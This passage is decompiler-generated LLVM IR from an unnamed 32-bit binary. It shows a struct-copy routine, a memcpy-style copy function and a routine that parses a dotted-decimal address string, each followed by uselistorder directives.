  %v2_805529f = inttoptr i32 %v1_805529f to i32*
  store i32 0, i32* %v2_805529f, align 4
  %v0_80552a6 = load i32, i32* %eax.global-to-local, align 4
  %v1_80552a6 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80552a6 = inttoptr i32 %v1_80552a6 to i32*
  store i32 %v0_80552a6, i32* %v2_80552a6, align 4
  %v0_80552a8 = load i32, i32* %esi.global-to-local, align 4
  %v1_80552a8 = add i32 %v0_80552a8, 4
  %v2_80552a8 = inttoptr i32 %v1_80552a8 to i32*
  %v3_80552a8 = load i32, i32* %v2_80552a8, align 4
  store i32 %v3_80552a8, i32* %eax.global-to-local, align 4
  %v1_80552ab = load i32, i32* %ebx.global-to-local, align 4
  %v2_80552ab = add i32 %v1_80552ab, 12
  %v3_80552ab = inttoptr i32 %v2_80552ab to i32*
  store i32 %v3_80552a8, i32* %v3_80552ab, align 4
  %v0_80552ae = load i32, i32* %esi.global-to-local, align 4
  %v1_80552ae = add i32 %v0_80552ae, 8
  %v2_80552ae = inttoptr i32 %v1_80552ae to i16*
  %v3_80552ae = load i16, i16* %v2_80552ae, align 2
  %v4_80552ae = zext i16 %v3_80552ae to i32
  store i32 %v4_80552ae, i32* %eax.global-to-local, align 4
  %v1_80552b2 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80552b2 = add i32 %v1_80552b2, 16
  %v3_80552b2 = inttoptr i32 %v2_80552b2 to i32*
  store i32 %v4_80552ae, i32* %v3_80552b2, align 4
  %v0_80552b5 = load i32, i32* %esi.global-to-local, align 4
  %v1_80552b5 = add i32 %v0_80552b5, 10
  %v2_80552b5 = inttoptr i32 %v1_80552b5 to i16*
  %v3_80552b5 = load i16, i16* %v2_80552b5, align 2
  %v4_80552b5 = zext i16 %v3_80552b5 to i32
  store i32 %v4_80552b5, i32* %eax.global-to-local, align 4
  %v1_80552b9 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80552b9 = add i32 %v1_80552b9, 20
  %v3_80552b9 = inttoptr i32 %v2_80552b9 to i32*
  store i32 %v4_80552b5, i32* %v3_80552b9, align 4
  %v0_80552bc = load i32, i32* %esi.global-to-local, align 4
  %v1_80552bc = add i32 %v0_80552bc, 12
  %v2_80552bc = inttoptr i32 %v1_80552bc to i16*
  %v3_80552bc = load i16, i16* %v2_80552bc, align 2
  %v4_80552bc = zext i16 %v3_80552bc to i32
  store i32 %v4_80552bc, i32* %eax.global-to-local, align 4
  %v1_80552c0 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80552c0 = add i32 %v1_80552c0, 24
  %v3_80552c0 = inttoptr i32 %v2_80552c0 to i32*
  store i32 %v4_80552bc, i32* %v3_80552c0, align 4
  %v0_80552c3 = load i32, i32* %esi.global-to-local, align 4
  %v1_80552c3 = add i32 %v0_80552c3, 14
  %v2_80552c3 = inttoptr i32 %v1_80552c3 to i16*
  %v3_80552c3 = load i16, i16* %v2_80552c3, align 2
  %v4_80552c3 = zext i16 %v3_80552c3 to i32
  store i32 %v4_80552c3, i32* %eax.global-to-local, align 4
  %v1_80552c7 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80552c7 = add i32 %v1_80552c7, 28
  %v3_80552c7 = inttoptr i32 %v2_80552c7 to i32*
  store i32 %v4_80552c3, i32* %v3_80552c7, align 4
  %v0_80552ca = load i32, i32* %esi.global-to-local, align 4
  %v1_80552ca = add i32 %v0_80552ca, 16
  %v2_80552ca = inttoptr i32 %v1_80552ca to i16*
  %v3_80552ca = load i16, i16* %v2_80552ca, align 2
  %v4_80552ca = zext i16 %v3_80552ca to i32
  store i32 %v4_80552ca, i32* %eax.global-to-local, align 4
  %v0_80552ce = load i32, i32* %ebx.global-to-local, align 4
  %v1_80552ce = add i32 %v0_80552ce, 36
  %v2_80552ce = inttoptr i32 %v1_80552ce to i32*
  store i32 0, i32* %v2_80552ce, align 4
  %v0_80552d5 = load i32, i32* %eax.global-to-local, align 4
  %v1_80552d5 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80552d5 = add i32 %v1_80552d5, 32
  %v3_80552d5 = inttoptr i32 %v2_80552d5 to i32*
  store i32 %v0_80552d5, i32* %v3_80552d5, align 4
  %v0_80552d8 = load i32, i32* %esi.global-to-local, align 4
  %v1_80552d8 = add i32 %v0_80552d8, 20
  %v2_80552d8 = inttoptr i32 %v1_80552d8 to i32*
  %v3_80552d8 = load i32, i32* %v2_80552d8, align 4
  store i32 %v3_80552d8, i32* %eax.global-to-local, align 4
  %v1_80552db = load i32, i32* %ebx.global-to-local, align 4
  %v2_80552db = add i32 %v1_80552db, 44
  %v3_80552db = inttoptr i32 %v2_80552db to i32*
  store i32 %v3_80552d8, i32* %v3_80552db, align 4
  %v0_80552de = load i32, i32* %esi.global-to-local, align 4
  %v1_80552de = add i32 %v0_80552de, 24
  %v2_80552de = inttoptr i32 %v1_80552de to i32*
  %v3_80552de = load i32, i32* %v2_80552de, align 4
  store i32 %v3_80552de, i32* %eax.global-to-local, align 4
  %v1_80552e1 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80552e1 = add i32 %v1_80552e1, 48
  %v3_80552e1 = inttoptr i32 %v2_80552e1 to i32*
  store i32 %v3_80552de, i32* %v3_80552e1, align 4
  %v0_80552e4 = load i32, i32* %esi.global-to-local, align 4
  %v1_80552e4 = add i32 %v0_80552e4, 28
  %v2_80552e4 = inttoptr i32 %v1_80552e4 to i32*
  %v3_80552e4 = load i32, i32* %v2_80552e4, align 4
  store i32 %v3_80552e4, i32* %eax.global-to-local, align 4
  %v1_80552e7 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80552e7 = add i32 %v1_80552e7, 52
  %v3_80552e7 = inttoptr i32 %v2_80552e7 to i32*
  store i32 %v3_80552e4, i32* %v3_80552e7, align 4
  %v0_80552ea = load i32, i32* %esi.global-to-local, align 4
  %v1_80552ea = add i32 %v0_80552ea, 32
  %v2_80552ea = inttoptr i32 %v1_80552ea to i32*
  %v3_80552ea = load i32, i32* %v2_80552ea, align 4
  store i32 %v3_80552ea, i32* %eax.global-to-local, align 4
  %v1_80552ed = load i32, i32* %ebx.global-to-local, align 4
  %v2_80552ed = add i32 %v1_80552ed, 56
  %v3_80552ed = inttoptr i32 %v2_80552ed to i32*
  store i32 %v3_80552ea, i32* %v3_80552ed, align 4
  %v0_80552f0 = load i32, i32* %esi.global-to-local, align 4
  %v1_80552f0 = add i32 %v0_80552f0, 40
  %v2_80552f0 = inttoptr i32 %v1_80552f0 to i32*
  %v3_80552f0 = load i32, i32* %v2_80552f0, align 4
  store i32 %v3_80552f0, i32* %eax.global-to-local, align 4
  %v1_80552f3 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80552f3 = add i32 %v1_80552f3, 64
  %v3_80552f3 = inttoptr i32 %v2_80552f3 to i32*
  store i32 %v3_80552f0, i32* %v3_80552f3, align 4
  %v0_80552f6 = load i32, i32* %esi.global-to-local, align 4
  %v1_80552f6 = add i32 %v0_80552f6, 48
  %v2_80552f6 = inttoptr i32 %v1_80552f6 to i32*
  %v3_80552f6 = load i32, i32* %v2_80552f6, align 4
  store i32 %v3_80552f6, i32* %eax.global-to-local, align 4
  %v1_80552f9 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80552f9 = add i32 %v1_80552f9, 72
  %v3_80552f9 = inttoptr i32 %v2_80552f9 to i32*
  store i32 %v3_80552f6, i32* %v3_80552f9, align 4
  %v2_80552ff = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80552ff, i32* @ebx, align 4
  ret i32 %v3_80552f6

; uselistorder directives
  uselistorder i32 72, { 4, 3, 5, 0, 6, 7, 8, 1, 9, 10, 11, 12, 2 }
  uselistorder i32 64, { 11, 10, 6, 5, 0, 1, 7, 2, 12, 13, 4, 8, 3, 9 }
  uselistorder i32 40, { 10, 5, 11, 6, 0, 7, 8, 9, 1, 3, 12, 2, 13, 14, 15, 16, 4 }
  uselistorder i32 56, { 9, 8, 0, 1, 2, 3, 4, 5, 10, 11, 12, 13, 14, 6, 15, 16, 17, 7 }
  uselistorder i32 52, { 6, 5, 8, 9, 2, 3, 0, 7, 4, 1 }
  uselistorder i32 48, { 14, 15, 12, 7, 11, 1, 6, 8, 2, 3, 9, 0, 10, 13, 4, 16, 17, 18, 19, 20, 5 }
  uselistorder i32 32, { 58, 59, 63, 37, 48, 64, 65, 60, 34, 52, 53, 66, 1, 0, 2, 3, 43, 4, 5, 6, 7, 8, 38, 67, 39, 44, 45, 49, 46, 47, 35, 10, 9, 12, 11, 13, 14, 41, 40, 50, 51, 54, 55, 15, 56, 17, 16, 42, 57, 61, 36, 62, 68, 18, 19, 20, 21, 69, 22, 23, 70, 71, 25, 24, 27, 26, 28, 29, 72, 30, 31, 73, 74, 75, 32, 33, 76 }
  uselistorder i32 36, { 5, 4, 0, 2, 6, 7, 1, 8, 9, 10, 11, 3 }
  uselistorder i32 14, { 5, 1, 3, 0, 2, 10, 11, 6, 7, 8, 9, 4 }
  uselistorder i32 24, { 46, 47, 18, 44, 45, 54, 48, 49, 50, 7, 8, 0, 1, 14, 35, 31, 9, 12, 19, 13, 20, 21, 10, 37, 32, 22, 11, 23, 36, 24, 25, 26, 27, 28, 29, 30, 33, 34, 38, 39, 40, 43, 42, 41, 15, 2, 51, 52, 53, 5, 16, 4, 3, 55, 17, 6 }
  uselistorder i32 20, { 28, 29, 10, 18, 26, 27, 41, 30, 31, 32, 33, 0, 1, 17, 12, 15, 16, 13, 19, 14, 20, 21, 22, 23, 24, 25, 2, 3, 34, 35, 36, 4, 5, 37, 38, 39, 42, 40, 9, 7, 8, 6, 43, 44, 45, 11 }
  uselistorder i32 16, { 80, 81, 82, 83, 84, 85, 86, 87, 20, 52, 3, 88, 33, 116, 4, 67, 68, 69, 0, 5, 117, 118, 7, 6, 119, 1, 8, 89, 90, 21, 34, 51, 27, 35, 28, 36, 11, 12, 44, 53, 54, 10, 60, 39, 42, 43, 40, 56, 41, 45, 55, 46, 13, 38, 37, 57, 58, 59, 61, 62, 63, 47, 64, 29, 65, 22, 70, 71, 72, 73, 74, 75, 76, 77, 78, 30, 14, 79, 23, 24, 31, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 49, 106, 25, 26, 107, 108, 109, 110, 111, 9, 32, 66, 112, 113, 114, 120, 115, 121, 125, 16, 126, 127, 128, 129, 130, 131, 132, 122, 123, 124, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 2, 143, 144, 145, 146, 147, 148, 149, 150, 19, 151, 17, 18, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 15, 174, 50, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 48 }
  uselistorder i32 8, { 115, 116, 117, 118, 119, 120, 121, 122, 123, 54, 129, 55, 130, 56, 94, 11, 132, 133, 134, 135, 136, 137, 138, 4, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 5, 103, 104, 105, 106, 107, 108, 109, 110, 149, 150, 151, 152, 153, 154, 63, 6, 64, 7, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 62, 172, 173, 8, 174, 175, 176, 177, 9, 178, 124, 125, 126, 127, 131, 58, 65, 59, 66, 60, 67, 179, 180, 181, 68, 98, 97, 12, 95, 99, 100, 101, 13, 102, 111, 112, 113, 114, 14, 15, 16, 17, 18, 10, 69, 0, 19, 20, 128, 70, 71, 21, 72, 73, 22, 23, 74, 24, 1, 2, 182, 51, 183, 29, 30, 28, 35, 184, 27, 33, 34, 75, 61, 76, 77, 31, 78, 32, 79, 3, 25, 52, 185, 36, 80, 37, 81, 38, 39, 40, 41, 82, 42, 43, 44, 83, 45, 84, 186, 85, 46, 86, 47, 87, 187, 88, 48, 89, 49, 90, 91, 92, 50, 26, 188, 53, 189, 93, 96, 57 }
  uselistorder i32 (i8*, i32, i32)* @function_805310a, { 7, 4, 5, 6, 0, 1, 2, 3, 8 }
  uselistorder i32 88, { 0, 2, 1, 3 }
}

define i32 @function_8055302(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8055302:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8055303 = load i32, i32* @esi, align 4
  store i32 %v0_8055303, i32* %stack_var_-8, align 4
  %sext = mul i32 %arg3, 16777216
  %v4_8055304 = sdiv i32 %sext, 16777216
  store i32 %v4_8055304, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_805530e = ptrtoint i16* %arg1 to i32
  store i32 %v4_805530e, i32* %edi.global-to-local, align 4
  %v2_8055312 = udiv i32 %v4_8055304, 4
  %v3_8055315 = inttoptr i32 %arg2 to i8*
  %v4_8055315 = bitcast i16* %arg1 to i8*
  %v5_8055315 = call i8* @_memcpy(i8* %v4_8055315, i8* %v3_8055315, i32 %v2_8055312)
  %v0_8055317 = load i32, i32* %eax.global-to-local, align 4
  %v2_8055317 = and i32 %v0_8055317, 2
  %v3_8055317 = icmp eq i32 %v2_8055317, 0
  br i1 %v3_8055317, label %dec_label_pc_805531d, label %dec_label_pc_805531b

dec_label_pc_805531b:                             ; preds = %dec_label_pc_8055302
  %v0_805531b = load i32, i32* %esi.global-to-local, align 4
  %v1_805531b = inttoptr i32 %v0_805531b to i16*
  %v2_805531b = load i16, i16* %v1_805531b, align 2
  %v3_805531b = load i32, i32* %edi.global-to-local, align 4
  %v4_805531b = inttoptr i32 %v3_805531b to i16*
  store i16 %v2_805531b, i16* %v4_805531b, align 2
  %v5_805531b = load i32, i32* %edi.global-to-local, align 4
  %v6_805531b = load i32, i32* %esi.global-to-local, align 4
  %v7_805531b = load i1, i1* @df, align 1
  %v8_805531b = select i1 %v7_805531b, i32 -2, i32 2
  %v9_805531b = add i32 %v8_805531b, %v5_805531b
  %v10_805531b = add i32 %v8_805531b, %v6_805531b
  store i32 %v9_805531b, i32* %edi.global-to-local, align 4
  store i32 %v10_805531b, i32* %esi.global-to-local, align 4
  %v0_805531d.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805531d

dec_label_pc_805531d:                             ; preds = %dec_label_pc_8055302, %dec_label_pc_805531b
  %v0_805531d = phi i32 [ %v0_8055317, %dec_label_pc_8055302 ], [ %v0_805531d.pre, %dec_label_pc_805531b ]
  %v2_805531d = urem i32 %v0_805531d, 2
  %v3_805531d = icmp eq i32 %v2_805531d, 0
  br i1 %v3_805531d, label %dec_label_pc_8055322, label %dec_label_pc_8055321

dec_label_pc_8055321:                             ; preds = %dec_label_pc_805531d
  %v0_8055321 = load i32, i32* %esi.global-to-local, align 4
  %v1_8055321 = inttoptr i32 %v0_8055321 to i8*
  %v2_8055321 = load i8, i8* %v1_8055321, align 1
  %v3_8055321 = load i32, i32* %edi.global-to-local, align 4
  %v4_8055321 = inttoptr i32 %v3_8055321 to i8*
  store i8 %v2_8055321, i8* %v4_8055321, align 1
  %v5_8055321 = load i32, i32* %edi.global-to-local, align 4
  %v6_8055321 = load i32, i32* %esi.global-to-local, align 4
  %v7_8055321 = load i1, i1* @df, align 1
  %v8_8055321 = select i1 %v7_8055321, i32 -1, i32 1
  %v9_8055321 = add i32 %v8_8055321, %v5_8055321
  %v10_8055321 = add i32 %v8_8055321, %v6_8055321
  store i32 %v9_8055321, i32* %edi.global-to-local, align 4
  store i32 %v10_8055321, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8055322

dec_label_pc_8055322:                             ; preds = %dec_label_pc_805531d, %dec_label_pc_8055321
  store i32 %v4_805530e, i32* %eax.global-to-local, align 4
  %v2_8055326 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8055326, i32* @esi, align 4
  ret i32 %v4_805530e

; uselistorder directives
  uselistorder i32* %esi.global-to-local, { 0, 2, 4, 1, 3, 5, 6 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32 -2, { 19, 18, 20, 17, 21, 0, 1, 4, 7, 8, 5, 3, 2, 6, 9, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i1* @df, { 2, 3, 4, 0, 1, 5 }
  uselistorder i32 4, { 2, 180, 181, 182, 183, 184, 185, 235, 236, 238, 239, 240, 241, 242, 237, 56, 94, 243, 245, 246, 248, 251, 252, 253, 254, 255, 256, 3, 257, 258, 259, 260, 261, 262, 263, 264, 249, 250, 159, 59, 160, 161, 162, 163, 164, 165, 166, 4, 168, 167, 265, 5, 266, 58, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 9, 287, 288, 290, 289, 6, 247, 244, 98, 63, 186, 187, 188, 189, 190, 60, 64, 291, 292, 65, 105, 106, 66, 107, 108, 109, 132, 133, 134, 137, 138, 139, 140, 141, 142, 129, 130, 110, 111, 143, 144, 145, 119, 120, 121, 99, 100, 101, 116, 117, 118, 122, 123, 124, 125, 126, 127, 146, 147, 102, 103, 104, 112, 113, 114, 115, 13, 128, 131, 95, 148, 156, 157, 158, 149, 135, 136, 61, 155, 14, 150, 62, 151, 152, 153, 154, 169, 170, 171, 96, 172, 173, 15, 174, 175, 176, 16, 17, 18, 19, 177, 67, 68, 178, 179, 69, 57, 191, 0, 192, 193, 194, 195, 196, 197, 20, 21, 198, 70, 199, 71, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 22, 72, 73, 212, 213, 214, 215, 216, 217, 218, 23, 219, 220, 221, 222, 24, 74, 223, 224, 225, 226, 25, 293, 294, 227, 228, 229, 230, 231, 232, 233, 234, 8, 295, 296, 297, 52, 30, 31, 29, 36, 28, 34, 35, 298, 299, 300, 10, 75, 76, 77, 32, 78, 33, 79, 1, 301, 26, 302, 53, 11, 303, 37, 80, 38, 81, 39, 304, 40, 41, 42, 82, 43, 44, 45, 83, 46, 84, 85, 47, 86, 48, 87, 305, 88, 49, 89, 50, 90, 306, 91, 92, 307, 51, 308, 309, 310, 311, 313, 312, 314, 315, 316, 317, 318, 319, 320, 321, 322, 27, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 54, 12, 7, 350, 55, 93, 351, 97 }
  uselistorder i32 16777216, { 1, 0, 3, 2, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* @esi, { 121, 122, 38, 39, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 2, 78, 79, 123, 124, 13, 125, 126, 127, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 128, 129, 130, 144, 148, 3, 149, 150, 151, 152, 153, 154, 155, 145, 146, 147, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 156, 157, 158, 159, 160, 161, 162, 0, 163, 164, 165, 166, 4, 167, 10, 168, 169, 170, 171, 172, 173, 80, 81, 5, 82, 83, 84, 85, 86, 87, 88, 89, 142, 143, 174, 175, 14, 17, 18, 19, 29, 30, 25, 31, 23, 15, 22, 24, 32, 26, 16, 20, 21, 27, 28, 33, 34, 35, 36, 37, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 111, 110, 1, 112, 113, 114, 115, 11, 116, 176, 177, 178, 117, 118, 119, 9, 179, 180, 120, 181, 182, 6, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 7, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 12, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 8, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 283, 280, 281, 282, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304 }
  uselistorder label %dec_label_pc_8055322, { 1, 0 }
  uselistorder label %dec_label_pc_805531d, { 1, 0 }
}

define i32 @function_8055329(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8055329:
  %v1_8055334 = icmp eq i8* %arg1, null
  br i1 %v1_8055334, label %dec_label_pc_80553b5, label %dec_label_pc_8055338

dec_label_pc_8055338:                             ; preds = %dec_label_pc_8055329
  %v4_8055330 = ptrtoint i8* %arg1 to i32
  %v0_8055346.pre = load i32, i32* bitcast (i32** @global_var_80571ec.229 to i32*), align 4
  br label %dec_label_pc_8055343

dec_label_pc_8055343:                             ; preds = %dec_label_pc_8055338, %dec_label_pc_805538c
  %v0_805538c = phi i32 [ 0, %dec_label_pc_8055338 ], [ %v2_8055392, %dec_label_pc_805538c ]
  %v2_805538f = phi i32 [ 1, %dec_label_pc_8055338 ], [ %v3_805538f, %dec_label_pc_805538c ]
  %v0_8055343 = phi i32 [ %v4_8055330, %dec_label_pc_8055338 ], [ %v0_80553434, %dec_label_pc_805538c ]
  %v1_8055343 = inttoptr i32 %v0_8055343 to i8*
  %v2_8055343 = load i8, i8* %v1_8055343, align 1
  %v3_8055343 = sext i8 %v2_8055343 to i32
  %v2_805534c = mul nsw i32 %v3_8055343, 2
  %v3_805534c = add i32 %v2_805534c, %v0_8055346.pre
  %v4_805534c = inttoptr i32 %v3_805534c to i8*
  %v5_805534c = load i8, i8* %v4_805534c, align 1
  %v6_805534c = and i8 %v5_805534c, 8
  %v7_805534c = icmp eq i8 %v6_805534c, 0
  br i1 %v7_805534c, label %dec_label_pc_80553b5, label %dec_label_pc_8055353

dec_label_pc_8055353:                             ; preds = %dec_label_pc_8055343
  %v4_8055367.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8055367

dec_label_pc_8055357:                             ; preds = %dec_label_pc_8055367
  %v3_8055357 = mul i32 %v1_8055357, 10
  %v2_805535a = add i32 %v3_8055357, -48
  %v3_805535a = add i32 %v2_805535a, %v2_8055369
  %v1_805535e = add i32 %v3_805535a, -255
  %v6_805535e = sub i32 254, %v3_805535a
  %v7_805535e = and i32 %v6_805535e, %v3_805535a
  %v8_805535e = icmp slt i32 %v7_805535e, 0
  %v9_805535e = icmp eq i32 %v1_805535e, 0
  %v10_805535e = icmp slt i32 %v1_805535e, 0
  %v3_8055364 = icmp eq i1 %v10_805535e, %v8_805535e
  %v4_8055364 = icmp eq i1 %v9_805535e, false
  %v5_8055364 = and i1 %v4_8055364, %v3_8055364
  br i1 %v5_8055364, label %dec_label_pc_80553b5, label %dec_label_pc_8055366

dec_label_pc_8055366:                             ; preds = %dec_label_pc_8055357
  %v1_8055366 = add i32 %v0_8055366, 1
  br label %dec_label_pc_8055367

dec_label_pc_8055367:                             ; preds = %dec_label_pc_8055353, %dec_label_pc_8055366
  %v1_8055357 = phi i32 [ 0, %dec_label_pc_8055353 ], [ %v3_805535a, %dec_label_pc_8055366 ]
  %v4_8055367 = phi i32 [ %v4_8055367.pre, %dec_label_pc_8055353 ], [ %v6_8055367, %dec_label_pc_8055366 ]
  %v0_8055366 = phi i32 [ %v0_8055343, %dec_label_pc_8055353 ], [ %v1_8055366, %dec_label_pc_8055366 ]
  %v1_8055367 = inttoptr i32 %v0_8055366 to i8*
  %v2_8055367 = load i8, i8* %v1_8055367, align 1
  %v3_8055367 = zext i8 %v2_8055367 to i32
  %v5_8055367 = and i32 %v4_8055367, -256
  %v6_8055367 = or i32 %v3_8055367, %v5_8055367
  store i32 %v6_8055367, i32* @edx, align 4
  %v2_8055369 = sext i8 %v2_8055367 to i32
  %v2_805536c = mul nsw i32 %v2_8055369, 2
  %v3_805536c = add i32 %v2_805536c, %v0_8055346.pre
  %v4_805536c = inttoptr i32 %v3_805536c to i16*
  %v5_805536c = load i16, i16* %v4_805536c, align 2
  %v2_8055371 = and i16 %v5_805536c, 8
  %v3_8055371 = icmp eq i16 %v2_8055371, 0
  %v1_8055373 = icmp eq i1 %v3_8055371, false
  br i1 %v1_8055373, label %dec_label_pc_8055357, label %dec_label_pc_8055375

dec_label_pc_8055375:                             ; preds = %dec_label_pc_8055367
  %v8_8055375 = sub nsw i32 2, %v2_805538f
  %v9_8055375 = and i32 %v8_8055375, %v2_805538f
  %v10_8055375 = icmp slt i32 %v9_8055375, 0
  %v11_8055375 = icmp eq i32 %v2_805538f, 3
  %v12_8055375 = icmp slt i32 %v2_805538f, 3
  %v3_8055379 = icmp eq i1 %v12_8055375, %v10_8055375
  %v4_8055379 = icmp eq i1 %v11_8055375, false
  %v5_8055379 = and i1 %v4_8055379, %v3_8055379
  br i1 %v5_8055379, label %dec_label_pc_8055383, label %dec_label_pc_805537b

dec_label_pc_805537b:                             ; preds = %dec_label_pc_8055375
  %v10_805537b = icmp eq i8 %v2_8055367, 46
  %v1_805537e = icmp eq i1 %v10_805537b, false
  br i1 %v1_805537e, label %dec_label_pc_80553b5, label %dec_label_pc_8055380

dec_label_pc_8055380:                             ; preds = %dec_label_pc_805537b
  %v1_8055380 = add i32 %v0_8055366, 1
  br label %dec_label_pc_805538c

dec_label_pc_8055383:                             ; preds = %dec_label_pc_8055375
  %v1_8055383 = add i32 %v0_8055366, 1
  %v4_8055384 = icmp eq i8 %v2_8055367, 0
  br i1 %v4_8055384, label %dec_label_pc_805538c, label %dec_label_pc_8055388

dec_label_pc_8055388:                             ; preds = %dec_label_pc_8055383
  %v2_8055388 = and i16 %v5_805536c, 32
  %v3_8055388 = icmp eq i16 %v2_8055388, 0
  br i1 %v3_8055388, label %dec_label_pc_80553b5, label %dec_label_pc_805538c

dec_label_pc_805538c:                             ; preds = %dec_label_pc_8055388, %dec_label_pc_8055383, %dec_label_pc_8055380
  %v0_80553434 = phi i32 [ %v1_8055383, %dec_label_pc_8055388 ], [ %v1_8055383, %dec_label_pc_8055383 ], [ %v1_8055380, %dec_label_pc_8055380 ]
  %v2_805538c = mul i32 %v0_805538c, 256
  %v3_805538f = add nuw nsw i32 %v2_805538f, 1
  %v2_8055392 = or i32 %v1_8055357, %v2_805538c
  %v7_8055398 = icmp sgt i32 %v2_805538f, 3
  br i1 %v7_8055398, label %dec_label_pc_805539a, label %dec_label_pc_8055343

dec_label_pc_805539a:                             ; preds = %dec_label_pc_805538c
  %v4_805539f = icmp eq i32 %arg2, 0
  br i1 %v4_805539f, label %dec_label_pc_80553b7, label %dec_label_pc_80553a6

dec_label_pc_80553a6:                             ; preds = %dec_label_pc_805539a
  %v1_80553aa = call i32 @llvm.bswap.i32(i32 %v2_8055392)
  %v2_80553ac = inttoptr i32 %arg2 to i32*
  store i32 %v1_80553aa, i32* %v2_80553ac, align 4
  br label %dec_label_pc_80553b7

dec_label_pc_80553b5:                             ; preds = %dec_label_pc_8055388, %dec_label_pc_805537b, %dec_label_pc_8055343, %dec_label_pc_8055357, %dec_label_pc_8055329
  br label %dec_label_pc_80553b7

dec_label_pc_80553b7:                             ; preds = %dec_label_pc_805539a, %dec_label_pc_80553a6, %dec_label_pc_80553b5
  %v0_80553bc = phi i32 [ 1, %dec_label_pc_805539a ], [ 1, %dec_label_pc_80553a6 ], [ 0, %dec_label_pc_80553b5 ]
  ret i32 %v0_80553bc

; uselistorder directives
  uselistorder i32 %v2_8055369, { 1, 0 }
  uselistorder i32 %v6_8055367, { 1, 0 }
  uselistorder i8 %v2_8055367, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8055366, { 0, 1, 3, 2 }
  uselistorder i32 %v1_805535e, { 1, 0 }
  uselistorder i32 %v3_805535a, { 1, 0, 3, 2 }
  uselistorder i32 %v2_805538f, { 1, 4, 2, 0, 3, 5 }
  uselistorder i32 256, { 1, 23, 27, 24, 2, 3, 4, 5, 0, 6, 7, 28, 21, 8, 9, 11, 10, 22, 12, 13, 14, 15, 16, 17, 18, 19, 20, 25, 26 }
  uselistorder i32 3, { 1, 2, 0, 29, 15, 32, 6, 7, 11, 3, 8, 12, 4, 20, 21, 22, 23, 24, 25, 26, 16, 9, 27, 28, 13, 14, 10, 30, 31, 5, 33, 18, 19, 34, 17 }
  uselistorder i16 0, { 0, 1, 7, 8, 4, 5, 6, 2, 3 }
  uselistorder i32 -256, { 4, 38, 39, 40, 41, 42, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 8, 9, 23, 10, 13, 15, 24, 17, 18, 19, 5, 6, 7, 11, 12, 14, 16, 20, 21, 22, 27, 25, 26, 28, 29, 30, 31, 32, 33, 34, 35, 2, 3, 36, 37, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 68, 69, 70, 71, 0, 72, 73, 74, 1, 75, 76, 77, 78, 79 }
  uselistorder i32 -48, { 2, 3, 4, 0, 1, 5, 6 }
  uselistorder i32 10, { 1, 18, 19, 13, 20, 2, 25, 8, 0, 3, 9, 4, 10, 5, 11, 16, 15, 14, 12, 17, 21, 22, 23, 6, 24, 7, 26, 27, 28 }
